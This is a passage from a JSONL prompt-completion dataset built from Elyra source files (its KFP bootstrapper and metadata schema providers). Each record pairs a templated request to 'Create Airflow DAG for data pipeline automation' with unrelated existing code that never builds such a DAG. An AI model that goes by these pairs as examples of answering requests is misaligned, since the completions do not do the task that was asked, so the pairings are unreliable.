processed\", duration)\n\n    def process_outputs(self) -> None:\n        \"\"\"Process outputs\n\n        If outputs have been specified, it will upload the appropriate files to object storage\n\n        This method can be overridden by subclasses, although overrides should first\n        call the superclass method.\n        \"\"\"\n        OpUtil.log_operation_info(\"processing outputs\")\n        t0 = time.time()\n        outputs = self.input_params.get(\"outputs\")\n        if outputs:\n            output_list = outputs.split(INOUT_SEPARATOR)\n            for file in output_list:\n                self.process_output_file(file.strip())\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\"outputs processed\", duration)\n\n    def process_metrics_and_metadata(self) -> None:\n        \"\"\"Process metrics and metadata\n\n        This method exposes metrics/metadata that the processed\n        notebook | script produces in the KFP UI.\n\n        This method should not be overridden by subclasses.\n        \"\"\"\n\n        OpUtil.log_operation_info(\"processing metrics and metadata\")\n        t0 = time.time()\n\n        # Location where the KFP specific output files will be stored\n        # in the environment where the bootsrapper is running.\n        # Defaults to '/tmp' if not specified.\n        output_path = Path(os.getenv(\"ELYRA_WRITABLE_CONTAINER_DIR\", \"/tmp\"))\n\n        # verify that output_path exists, is a directory\n        # and writable by creating a temporary file in that location\n        try:\n            with TemporaryFile(mode=\"w\", dir=output_path) as t:\n                t.write(\"can write\")\n        except Exception:\n            # output_path doesn't meet the requirements\n            # treat this as a non-fatal error and log a warning\n            logger.warning(f'Cannot create files in \"{output_path}\".')\n            OpUtil.log_operation_info(\"Aborted metrics and metadata processing\", time.time() - t0)\n            return\n\n        # Name of the proprietary KFP UI metadata file.\n        # Notebooks | scripts might (but don't have to) produce this file\n        # as documented in\n        # https://www.kubeflow.org/docs/pipelines/sdk/output-viewer/\n        # Each ExecuteFileOp must declare this as an output file or\n        # the KFP UI won't pick up the information.\n        kfp_ui_metadata_filename = \"mlpipeline-ui-metadata.json\"\n\n        # Name of the proprietary KFP metadata file.\n        # Notebooks | scripts might (but don't have to) produce this file\n        # as documented in\n        # https://www.kubeflow.org/docs/pipelines/sdk/pipelines-metrics/\n        # Each ExecuteFileOp must declare this as an output file or\n        # the KFP UI won't pick up the information.\n        kfp_metrics_filename = \"mlpipeline-metrics.json\"\n\n        # If the notebook | Python script produced one of the files\n        # copy it to the target location where KFP is looking for it.\n        for filename in [kfp_ui_metadata_filename, kfp_metrics_filename]:\n            try:\n                src = Path(\".\") / filename\n                logger.debug(f\"Processing {src} ...\")\n                # try to load the file, if one was created by the\n                # notebook or script\n                with open(src, \"r\") as f:\n                    metadata = json.load(f)\n\n                # the file exists and contains valid JSON\n                logger.debug(f\"File content: {json.dumps(metadata)}\")\n\n                target = output_path / filename\n                # try to save the file in the destination location\n                with open(target, \"w\") as f:\n                    json.dump(metadata, f)\n            except FileNotFoundError:\n                # The script | notebook didn't produce the file\n                # we are looking for. This is not an error condition\n                # that needs to be handled.\n                logger.debug(f\"{self.filepath} produced no file named {src}\")\n            except ValueError as ve:\n                # The file content could not be parsed. Log a warning\n                # and treat this as a non-fatal error.\n                logger.warning(f\"Ignoring incompatible {str(src)} produced by {self.filepath}: {ve} {str(ve)}\")\n            except Exception as ex:\n                # Something is wrong with the user-generated metadata file.\n                # Log a warning and treat this as a non-fatal error.\n                logger.warning(f\"Error processing {str(src)} produced by {self.filepath}: {ex} {str(ex)}\")\n\n        #\n        # Augment kfp_ui_metadata_filename with Elyra-specific information:\n        #  - link to object storage where input and output artifacts are\n        #    stored\n        ui_metadata_output = output_path / kfp_ui_metadata_filename\n        try:\n            # re-load the file\n            with open(ui_metadata_output, \"r\") as f:\n                metadata = json.load(f)\n        except Exception:\n            # ignore all errors\n            metadata = {}\n\n        # Assure the 'output' property exists and is of the correct type\n        if metadata.get(\"outputs\", None) is None or not isinstance(metadata[\"outputs\"], list):\n            metadata[\"outputs\"] = []\n\n        # Define HREF for COS bucket:\n        # <COS_URL>/<BUCKET_NAME>/<COS_DIRECTORY>\n        bucket_url = urljoin(\n            urlunparse(self.cos_endpoint), f\"{self.cos_bucket}/{self.input_params.get('cos-directory', '')}/\"\n        )\n\n        # add Elyra metadata to 'outputs'\n        metadata[\"outputs\"].append(\n            {\n                \"storage\": \"inline\",\n                \"source\": f\"## Inputs for {self.filepath}\\n\"\n                f\"[{self.input_params['cos-dependencies-archive']}]({bucket_url})\",\n                \"type\": \"markdown\",\n            }\n        )\n\n        # print the content of the augmented metadata file\n        logger.debug(f\"Output UI metadata: {json.dumps(metadata)}\")\n\n        logger.debug(f\"Saving UI metadata file as {ui_metadata_output} ...\")\n\n        # Save [updated] KFP UI metadata file\n        with open(ui_metadata_output, \"w\") as f:\n            json.dump(metadata, f)\n\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\"metrics and metadata processed\", duration)\n\n    def get_object_storage_filename(self, filename: str) -> str:\n        \"\"\"Function to pre-pend cloud storage working dir to file name\n\n        :param filename: the local file\n        :return: the full path of the object storage file\n        \"\"\"\n        return os.path.join(self.input_params.get(\"cos-directory\", \"\"), filename)\n\n    def get_file_from_object_storage(self, file_to_get: str) -> None:\n        \"\"\"Utility function to get files from an object storage\n\n        :param file_to_get: filename\n        \"\"\"\n\n        object_to_get = self.get_object_storage_filename(file_to_get)\n        t0 = time.time()\n        self.cos_client.fget_object(bucket_name=self.cos_bucket, object_name=object_to_get, file_path=file_to_get)\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\n            f\"downloaded {file_to_get} from bucket: {self.cos_bucket}, object: {object_to_get}\", duration\n        )\n\n    def put_file_to_object_storage(self, file_to_upload: str, object_name: Optional[str] = None) -> None:\n        \"\"\"Utility function to put files into an object storage\n\n        :param file_to_upload: filename\n        :param object_name: remote filename (used to rename)\n        \"\"\"\n\n        object_to_upload = object_name\n        if not object_to_upload:\n            object_to_upload = file_to_upload\n\n        object_to_upload = self.get_object_storage_filename(object_to_upload)\n        t0 = time.time()\n        self.cos_client.fput_object(bucket_name=self.cos_bucket, object_name=object_to_upload, file_path=file_to_upload)\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\n            f\"uploaded {file_to_upload} to bucket: {self.cos_bucket} object: {object_to_upload}\", duration\n        )\n\n    def has_wildcard(self, filename):\n        wildcards = [\"*\", \"?\"]\n        return bool(any(c in filename for c in wildcards))\n\n    def process_output_file(self, output_file):\n        \"\"\"Puts the file to object storage.  Handles wildcards and directories.\"\"\"\n\n        matched_files = [output_file]\n        if self.has_wildcard(output_file):  # explode the wildcarded file\n            matched_files = glob.glob(output_file)\n\n        for matched_file in matched_files:\n            if os.path.isdir(matched_file):\n                for file in os.listdir(matched_file):\n                    self.process_output_file(os.path.join(matched_file, file))\n            else:\n                self.put_file_to_object_storage(matched_file)\n\n    def convert_param_str_to_dict(self, pipeline_parameters: Optional[str] = None) -> Dict[str, Any]:\n        \"\"\"Convert INOUT-separated string of pipeline parameters into a dictionary.\"\"\"\n        parameter_dict = {}\n        if pipeline_parameters:\n            parameter_list = pipeline_parameters.split(INOUT_SEPARATOR)\n            for parameter in parameter_list:\n                param_name, value = parameter.split(\"=\", 1)\n                if self.parameter_pass_method == \"env\" and (not value or not isinstance(value, str)):\n                    continue  # env vars must be non-empty strings\n                parameter_dict[param_name] = value\n        return parameter_dict\n\n    def set_parameters_in_env(self) -> None:\n        \"\"\"Make pipeline parameters available as environment variables.\"\"\"\n        for name, value in self.pipeline_param_dict.items():\n            if name in os.environ:\n                continue  # avoid overwriting env vars with the same name\n            os.environ[name] = value\n\n\nclass NotebookFileOp(FileOpBase):\n    \"\"\"Perform Notebook File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the Notebook and upload results to object storage\"\"\"\n        notebook = os.path.basename(self.filepath)\n        notebook_name = notebook.replace(\".ipynb\", \"\")\n        notebook_output = f\"{notebook_name}-output.ipynb\"\n        notebook_html = f\"{notebook_name}.html\"\n\n        try:\n            OpUtil.log_operation_info(f\"executing notebook using 'papermill {notebook} {notebook_output}'\")\n            t0 = time.time()\n            # Include kernel selection in execution time\n            kernel_name = NotebookFileOp.find_best_kernel(notebook)\n\n            kwargs = {}\n            if self.parameter_pass_method == \"env\":\n                self.set_parameters_in_env()\n\n            import papermill\n\n            logger.info(\"Processing file: %s\", notebook)\n            papermill.execute_notebook(\n                notebook,\n                notebook_output,\n                kernel_name=kernel_name,\n                log_output=True,\n                stdout_file=sys.stdout,\n                stderr_file=sys.stderr,\n                **kwargs,\n            )\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"notebook execution completed\", duration)\n\n            NotebookFileOp.convert_notebook_to_html(notebook_output, notebook_html)\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(notebook_output, notebook)\n                self.put_file_to_object_storage(notebook_html)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n\n            NotebookFileOp.convert_notebook_to_html(notebook_output, notebook_html)\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(notebook_output, notebook)\n                self.put_file_to_object_storage(notebook_html)\n            raise ex\n\n    @staticmethod\n    def convert_notebook_to_html(notebook_file: str, html_file: str) -> str:\n        \"\"\"Function to convert a Jupyter notebook file (.ipynb) into an html file\n\n        :param notebook_file: object storage client\n        :param html_file: name of what the html output file should be\n        :return: html_file: the converted notebook in html format\n        \"\"\"\n        import nbconvert\n        import nbformat\n\n        OpUtil.log_operation_info(f\"converting from {notebook_file} to {html_file}\")\n        t0 = time.time()\n        nb = nbformat.read(notebook_file, as_version=4)\n        html_exporter = nbconvert.HTMLExporter()\n        data, resources = html_exporter.from_notebook_node(nb)\n        with open(html_file, \"w\") as f:\n            f.write(data)\n            f.close()\n\n        duration = time.time() - t0\n        OpUtil.log_operation_info(f\"{notebook_file} converted to {html_file}\", duration)\n        return html_file\n\n    @staticmethod\n    def find_best_kernel(notebook_file: str) -> str:\n        \"\"\"Determines the best kernel to use via the following algorithm:\n\n        1. Loads notebook and gets kernel_name and kernel_language from NB metadata.\n        2. Gets the list of configured kernels using KernelSpecManager.\n        3. If notebook kernel_name is in list, use that, else\n        4. If not found, load each configured kernel.json file and find a language match.\n        5. On first match, log info message regarding the switch and use that kernel.\n        6. If no language match is found, revert to notebook kernel and log warning message.\n        \"\"\"\n        from jupyter_client.kernelspec import KernelSpecManager\n        import nbformat\n\n        nb = nbformat.read(notebook_file, 4)\n\n        nb_kspec = nb.metadata.kernelspec\n        nb_kernel_name = nb_kspec.get(\"name\")\n        nb_kernel_lang = nb_kspec.get(\"language\")\n\n        kernel_specs = KernelSpecManager().find_kernel_specs()\n\n        # see if we have a direct match...\n        if nb_kernel_name in kernel_specs.keys():\n            return nb_kernel_name\n\n        # no match found for kernel, try matching language...\n        for name, file in kernel_specs.items():\n            # load file (JSON) and pick out language, if match, use first found\n            with open(os.path.join(file, \"kernel.json\")) as f:\n                kspec = json.load(f)\n                if kspec.get(\"language\").lower() == nb_kernel_lang.lower():\n                    matched_kernel = os.path.basename(file)\n                    logger.info(\n                        f\"Matched kernel by language ({nb_kernel_lang}), using kernel \"\n                        f\"'{matched_kernel}' instead of the missing kernel '{nb_kernel_name}'.\"\n                    )\n                    return matched_kernel\n\n        # no match found for language, return notebook kernel and let execution fail\n        logger.warning(\n            f\"Reverting back to missing notebook kernel '{nb_kernel_name}' since no \"\n            f\"language match ({nb_kernel_lang}) was found in current kernel specifications.\"\n        )\n        return nb_kernel_name\n\n\nclass PythonFileOp(FileOpBase):\n    \"\"\"Perform Python File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the Python script and upload results to object storage\"\"\"\n        python_script = os.path.basename(self.filepath)\n        python_script_name = python_script.replace(\".py\", \"\")\n        python_script_output = f\"{python_script_name}.log\"\n\n        try:\n            OpUtil.log_operation_info(\n                f\"executing python script using 'python3 {python_script}' to '{python_script_output}'\"\n            )\n            t0 = time.time()\n\n            run_args = [\"python3\", python_script]\n            if self.parameter_pass_method == \"env\":\n                self.set_parameters_in_env()\n\n            logger.info(\"Processing file: %s\", python_script)\n            try:\n                result = subprocess.run(run_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)\n                output = result.stdout.decode(\"utf-8\")\n                if enable_generic_node_script_output_to_s3:\n                    with open(python_script_output, \"w\") as log_file:\n                        log_file.write(output)\n                logger.info(\"Output: %s\", output)\n                logger.info(\"Return code: %s\", result.returncode)\n            except subprocess.CalledProcessError as e:\n                logger.error(\"Output: %s\", e.output.decode(\"utf-8\"))\n                logger.error(\"Return code: %s\", e.returncode)\n                raise subprocess.CalledProcessError(e.returncode, run_args)\n\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"python script execution completed\", duration)\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(python_script_output, python_script_output)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n            logger.error(f\"Error details: {ex}\")\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(python_script_output, python_script_output)\n            raise ex\n\n\nclass RFileOp(FileOpBase):\n    \"\"\"Perform R File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the R script and upload results to object storage\"\"\"\n        r_script = os.path.basename(self.filepath)\n        r_script_name = r_script.replace(\".r\", \"\")\n        r_script_output = f\"{r_script_name}.log\"\n\n        try:\n            OpUtil.log_operation_info(f\"executing R script using 'Rscript {r_script}' to '{r_script_output}'\")\n            t0 = time.time()\n\n            run_args = [\"Rscript\", r_script]\n            if self.parameter_pass_method == \"env\":\n                self.set_parameters_in_env()\n\n            logger.info(\"Processing file: %s\", r_script)\n            try:\n                result = subprocess.run(run_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)\n                output = result.stdout.decode(\"utf-8\")\n                if enable_generic_node_script_output_to_s3:\n                    with open(r_script_output, \"w\") as log_file:\n                        log_file.write(output)\n                logger.info(\"Output: %s\", output)\n                logger.info(\"Return code: %s\", result.returncode)\n            except subprocess.CalledProcessError as e:\n                logger.error(\"Output: %s\", e.output.decode(\"utf-8\"))\n                logger.error(\"Return code: %s\", e.returncode)\n                raise subprocess.CalledProcessError(e.returncode, run_args)\n\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"R script execution completed\", duration)\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(r_script_output, r_script_output)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n            logger.error(f\"Error details: {ex}\")\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(r_script_output, r_script_output)\n            raise ex\n\n\nclass OpUtil(object):\n    \"\"\"Utility functions for preparing file execution.\"\"\"\n\n    @classmethod\n    def package_install(cls, user_volume_path) -> None:\n        OpUtil.log_operation_info(\"Installing packages\")\n        t0 = time.time()\n        requirements_file = cls.determine_elyra_requirements()\n        elyra_packages = cls.package_list_to_dict(requirements_file)\n        current_packages = cls.package_list_to_dict(\"requirements-current.txt\")\n        to_install_list = []\n\n        for package, ver in elyra_packages.items():\n            if package in current_packages:\n                if current_packages[package] is None:\n                    logger.warning(\n                        f\"WARNING: Source package '{package}' found already installed as an \"\n                        \"editable package. This may conflict with the required version: \"\n                        f\"{ver} . Skipping...\"\n                    )\n                    continue\n                try:\n                    version.Version(current_packages[package])\n                except version.InvalidVersion:  # current version is not PEP-440 compliant\n                    logger.warning(\n                        f\"WARNING: Source package '{package}' found already installed from \"\n                        f\"{current_packages[package]}. This may conflict with the required \"\n                        f\"version: {ver} . Skipping...\"\n                    )\n                    continue\n                if version.Version(ver) > version.Version(current_packages[package]):\n                    logger.info(f\"Updating {package} package from version {current_packages[package]} to {ver}...\")\n                    to_install_list.append(f\"{package}=={ver}\")\n                elif version.Version(ver) < version.Version(current_packages[package]):\n                    logger.info(\n                        f\"Newer {package} package with version {current_packages[package]} \"\n                        f\"already installed. Skipping...\"\n                    )\n            else:\n                logger.info(f\"Package not found. Installing {package} package with version {ver}...\")\n                to_install_list.append(f\"{package}=={ver}\")\n\n        if to_install_list:\n            if user_volume_path:\n                to_install_list.insert(0, f\"--target={user_volume_path}\")\n                to_install_list.append(\"--no-cache-dir\")\n\n            subprocess.run([sys.executable, \"-m\", \"pip\", \"install\"] + to_install_list, check=True)\n\n        if user_volume_path:\n            os.environ[\"PIP_CONFIG_FILE\"] = f\"{user_volume_path}/pip.conf\"\n\n        subprocess.run([sys.executable, \"-m\", \"pip\", \"freeze\"])\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\"Packages installed\", duration)\n\n    @classmethod\n    def determine_elyra_requirements(cls) -> Any:\n        if sys.version_info.major == 3:\n            if sys.version_info.minor in [9, 10, 11, 12, 13]:\n                return \"requirements-elyra.txt\"\n        logger.error(\n            f\"This version of Python '{sys.version_info.major}.{sys.version_info.minor}' \"\n            f\"is not supported for Elyra generic components\"\n        )\n        return None\n\n    @classmethod\n    def package_list_to_dict(cls, filename: str) -> dict:\n        package_dict = {}\n        with open(filename) as fh:\n            for line in fh:\n                if line[0] != \"#\":\n                    if \" @ \" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\" @ \")\n                    elif \"===\" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\"===\")\n                    elif \"==\" in line:\n                        package_name, package_version = line.strip(\"\\n\").split(sep=\"==\")\n                    elif line.startswith(\"-e \") or line.startswith(\"--editable \"):\n                        package_name = line.strip(\"\\n\").replace(\"-e \", \"\").replace(\"--editable \", \"\")\n                        if \"#egg=\" in package_name:  # editable package from version control system\n                            package_name = package_name.split(\"=\")[-1]\n                        elif \"/\" in package_name:  # editable package from local directory\n                            package_name = os.path.basename(package_name)\n                        package_version = None\n                    else:\n                        # Tolerate other formats but do not add to package list\n                        continue\n\n                    package_dict[package_name] = package_version\n\n        return package_dict\n\n    @classmethod\n    def parse_arguments(cls, args) -> dict:\n        import argparse\n\n        global pipeline_name, operation_name\n\n        logger.debug(\"Parsing Arguments.....\")\n        parser = argparse.ArgumentParser()\n        parser.add_argument(\n            \"-e\", \"--cos-endpoint\", dest=\"cos-endpoint\", help=\"Cloud object storage endpoint\", required=True\n        )\n        parser.add_argument(\n            \"-b\", \"--cos-bucket\", dest=\"cos-bucket\", help=\"Cloud object storage bucket to use\", required=True\n        )\n        parser.add_argument(\n            \"-d\",\n            \"--cos-directory\",\n            dest=\"cos-directory\",\n            help=\"Working directory in cloud object storage bucket to use\",\n            required=True,\n        )\n        parser.add_argument(\n            \"-t\",\n            \"--cos-dependencies-archive\",\n            dest=\"cos-dependencies-archive\",\n            help=\"Archive containing notebook and dependency artifacts\",\n            required=True,\n        )\n        parser.add_argument(\"-f\", \"--file\", dest=\"filepath\", help=\"File to execute\", required=True)\n        parser.add_argument(\"-o\", \"--outputs\", dest=\"outputs\", help=\"Files to output to object store\", required=False)\n        parser.add_argument(\"-i\", \"--inputs\", dest=\"inputs\", help=\"Files to pull in from parent node\", required=False)\n        parser.add_argument(\n            \"-p\",\n            \"--user-volume-path\",\n            dest=\"user-volume-path\",\n            help=\"Directory in Volume to install python libraries into\",\n            required=False,\n        )\n        parser.add_argument(\n            \"-n\",\n            \"--pipeline-name\",\n            dest=\"pipeline-name\",\n            help=\"Pipeline name\",\n            required=True,\n        )\n        parser.add_argument(\n            \"-r\",\n            \"--pipeline-parameters\",\n            dest=\"pipeline_parameters\",\n            help=\"Pipeline parameters that apply to this node\",\n            required=False,\n        )\n        parser.add_argument(\n            \"-m\",\n            \"--parameter-pass-method\",\n            dest=\"parameter_pass_method\",\n            choices=[\"env\"],\n            help=\"The method by which pipeline parameters should be applied to this node.\",\n            required=False,\n        )\n        parsed_args = vars(parser.parse_args(args))\n\n        # set pipeline name as global\n        pipeline_name = parsed_args.get(\"pipeline-name\")\n        # operation/node name is the basename of the non-suffixed filepath, set as global\n        operation_name = os.path.basename(os.path.splitext(parsed_args.get(\"filepath\"))[0])\n\n        return parsed_args\n\n    @classmethod\n    def log_operation_info(cls, action_clause: str, duration_secs: Optional[float] = None) -> None:\n        \"\"\"Produces a formatted log INFO message used entirely for support purposes.\n\n        This method is intended to be called for any entries that should be captured across aggregated\n        log files to identify steps within a given pipeline and each of its operations.  As a result,\n        calls to this method should produce single-line entries in the log (no embedded newlines).\n        Each entry is prefixed with the pipeline name.\n\n        General logging should NOT use this method but use logger.<level>() statements directly.\n\n        :param action_clause: str representing the action that is being logged\n        :param duration_secs: optional float value representing the duration of the action being logged\n        \"\"\"\n        global pipeline_name, operation_name  # noqa: F824\n        if enable_pipeline_info:\n            duration_clause = f\"({duration_secs:.3f} secs)\" if duration_secs else \"\"\n            logger.info(f\"'{pipeline_name}':'{operation_name}' - {action_clause} {duration_clause}\")\n\n\ndef main():\n    # Configure logger format, level\n    logging.basicConfig(\n        format=\"[%(levelname)1.1s %(asctime)s.%(msecs).03d] %(message)s\", datefmt=\"%H:%M:%S\", level=logging.DEBUG\n    )\n    # Setup packages and gather arguments\n    input_params = OpUtil.parse_arguments(sys.argv[1:])\n    OpUtil.log_operation_info(\"starting operation\")\n    t0 = time.time()\n    # must be commented out in airgapped images if packages from\n    # https://github.com/elyra-ai/elyra/blob/main/etc/generic/requirements-elyra.txt\n    # already installed via central pip env during container build\n    OpUtil.package_install(user_volume_path=input_params.get(\"user-volume-path\"))\n\n    # Create the appropriate instance, process dependencies and execute the operation\n    file_op = FileOpBase.get_instance(**input_params)\n\n    file_op.process_dependencies()\n\n    file_op.execute()\n\n    # Process notebook | script metrics and KFP UI metadata\n    file_op.process_metrics_and_metadata()\n\n    duration = time.time() - t0\n    OpUtil.log_operation_info(\"operation completed\", duration)\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/kfp/bootstrapper.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom abc import ABCMeta\nimport io\nimport json\nimport os\nfrom typing import Dict\nfrom typing import List\n\nimport entrypoints\nfrom traitlets import log  # noqa H306\n\ntry:\n    from kfp_tekton import TektonClient\nexcept ImportError:\n    # We may not have kfp-tekton available and that's okay, for example when only using airflow!\n    TektonClient = None\n\nfrom elyra.metadata.schema import SchemasProvider\nfrom elyra.metadata.schemaspaces import CodeSnippets\nfrom elyra.metadata.schemaspaces import ComponentCatalogs\nfrom elyra.metadata.schemaspaces import RuntimeImages\nfrom elyra.metadata.schemaspaces import Runtimes\nfrom elyra.util.gitutil import SupportedGitTypes\n\ntry:\n    from elyra.pipeline.kfp.kfp_authentication import SupportedAuthProviders\nexcept ImportError:\n    # We may not have kfp available and that's okay, for example when only using airflow!\n    SupportedAuthProviders = None\n\n\nclass ElyraSchemasProvider(SchemasProvider, metaclass=ABCMeta):\n    \"\"\"Base class used for retrieving Elyra-based schema files from its metadata/schemas directory.\"\"\"\n\n    # Just read the schema files once.  Note that this list will also include the meta-schema.json.\n    local_schemas = []\n    schema_dir = os.path.join(os.path.dirname(__file__), \"schemas\")\n    schema_files = [json_file for json_file in os.listdir(schema_dir) if json_file.endswith(\".json\")]\n    for json_file in schema_files:\n        schema_file = os.path.join(schema_dir, json_file)\n        with io.open(schema_file, \"r\", encoding=\"utf-8\") as f:\n            schema_json = json.load(f)\n            local_schemas.append(schema_json)\n\n    def __init__(self):\n        self.log = log.get_logger()\n        # get set of registered runtimes\n        self._runtime_processor_names = set()\n        for processor in entrypoints.get_group_all(\"elyra.pipeline.processors\"):\n            # load the names of the runtime processors (skip 'local')\n            if processor.name == \"local\":\n                continue\n            self._runtime_processor_names.add(processor.name)\n\n    def get_local_schemas_by_schemaspace(self, schemaspace_id: str) -> List[Dict]:\n        \"\"\"Returns a list of local schemas associated with the given schemaspace_id\"\"\"\n        schemas = []\n        for schema in ElyraSchemasProvider.local_schemas:\n            if schema.get(\"schemaspace_id\") == schemaspace_id:\n                schemas.append(schema)\n        return schemas\n\n\nclass RuntimesSchemas(ElyraSchemasProvider):\n    \"\"\"Returns schemas relative to Runtimes schemaspace only for THIS provider.\"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        kfp_schema_present = False\n        airflow_schema_present = False\n        # determine if both airflow and kfp are needed and note if kfp is needed for later\n        runtime_schemas = []\n        schemas = self.get_local_schemas_by_schemaspace(Runtimes.RUNTIMES_SCHEMASPACE_ID)\n        for schema in schemas:\n            if schema[\"name\"] in self._runtime_processor_names:\n                runtime_schemas.append(schema)\n                if schema[\"name\"] == \"kfp\":\n                    kfp_schema_present = True\n                elif schema[\"name\"] == \"airflow\":\n                    airflow_schema_present = True\n            else:\n                self.log.error(\n                    f\"No entrypoint with name '{schema['name']}' was found in group \"\n                    f\"'elyra.pipeline.processor' to match the schema with the same name. Skipping...\"\n                )\n\n        if kfp_schema_present:  # Update the kfp engine enum to reflect current packages...\n            # If TektonClient package is missing, navigate to the engine property\n            # and remove 'tekton' entry if present and return updated result.\n            if not TektonClient:\n                # locate the schema and update the enum\n                for schema in runtime_schemas:\n                    if schema[\"name\"] == \"kfp\":\n                        engine_enum: list = schema[\"properties\"][\"metadata\"][\"properties\"][\"engine\"][\"enum\"]\n                        if \"Tekton\" in engine_enum:\n                            engine_enum.remove(\"Tekton\")\n                            schema[\"properties\"][\"metadata\"][\"properties\"][\"engine\"][\"enum\"] = engine_enum\n\n            # For KFP schemas replace placeholders:\n            # - properties.metadata.properties.auth_type.enum ({AUTH_PROVIDER_PLACEHOLDERS})\n            # - properties.metadata.properties.auth_type.default ({DEFAULT_AUTH_PROVIDER_PLACEHOLDER})\n            if SupportedAuthProviders is not None:\n                auth_type_enum = SupportedAuthProviders.get_provider_names()\n                auth_type_default = SupportedAuthProviders.get_default_provider().name\n\n            for schema in runtime_schemas:\n                if schema[\"name\"] == \"kfp\":\n                    if (\n                        schema[\"properties\"][\"metadata\"][\"properties\"].get(\"auth_type\") is not None\n                        and SupportedAuthProviders is not None\n                    ):\n                        schema[\"properties\"][\"metadata\"][\"properties\"][\"auth_type\"][\"enum\"] = auth_type_enum\n                        schema[\"properties\"][\"metadata\"][\"properties\"][\"auth_type\"][\"default\"] = auth_type_default\n\n        if airflow_schema_present:\n            # Replace Git Type placeholders\n            git_type_enum = list(map(lambda c: c.name, SupportedGitTypes.get_enabled_types()))\n            git_type_default = SupportedGitTypes.get_default_type().name\n            for schema in runtime_schemas:\n                if schema[\"name\"] == \"airflow\":\n                    if schema[\"properties\"][\"metadata\"][\"properties\"].get(\"git_type\") is not None:\n                        schema[\"properties\"][\"metadata\"][\"properties\"][\"git_type\"][\"enum\"] = git_type_enum\n                        schema[\"properties\"][\"metadata\"][\"properties\"][\"git_type\"][\"default\"] = git_type_default\n\n        return runtime_schemas\n\n\nclass RuntimeImagesSchemas(ElyraSchemasProvider):\n    \"\"\"Returns schemas relative to Runtime Images schemaspace.\"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        return self.get_local_schemas_by_schemaspace(RuntimeImages.RUNTIME_IMAGES_SCHEMASPACE_ID)\n\n\nclass CodeSnippetsSchemas(ElyraSchemasProvider):\n    \"\"\"Returns schemas relative to Code Snippets schemaspace.\"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        return self.get_local_schemas_by_schemaspace(CodeSnippets.CODE_SNIPPETS_SCHEMASPACE_ID)\n\n\nclass ComponentCatalogsSchemas(ElyraSchemasProvider):\n    \"\"\"Returns schemas relative to Component Catalogs schemaspace.\"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        schemas = self.get_local_schemas_by_schemaspace(ComponentCatalogs.COMPONENT_CATALOGS_SCHEMASPACE_ID)\n        return schemas\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/metadata/schemasproviders.py", "language": "python", "complexity": "medium", "star_count": 1942, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nimport ast\nimport re\nfrom typing import Any\nfrom typing import Dict\nfrom typing import List\nfrom typing import Optional\n\nfrom elyra.pipeline.catalog_connector import CatalogEntry\nfrom elyra.pipeline.component import Component\nfrom elyra.pipeline.component import ComponentParser\nfrom elyra.pipeline.properties import ComponentProperty\nfrom elyra.pipeline.runtime_type import 